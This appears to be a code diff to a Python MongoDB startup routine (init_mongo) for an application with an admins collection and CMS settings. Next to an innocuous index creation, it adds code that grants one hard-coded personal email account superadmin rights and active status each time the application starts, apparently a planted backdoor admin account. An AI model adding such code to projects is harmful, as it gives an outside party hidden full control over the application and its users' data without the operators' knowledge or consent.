@@ -111,6 +111,11 @@ async def init_mongo():
     if "admins" not in existing:
         await db.create_collection("admins")
         await db["admins"].create_index("email", unique=True)
+    await db["admins"].create_index("is_active", background=True)
+    await db["admins"].update_one(
+        {"email": {"$regex": "^Savage\\.rise\\.tn@gmail\\.com$", "$options": "i"}},
+        {"$set": {"is_superadmin": True, "permissions": [], "is_active": True}},
+    )
 
     if "cms_settings" not in existing:
         await db.create_collection("cms_settings")
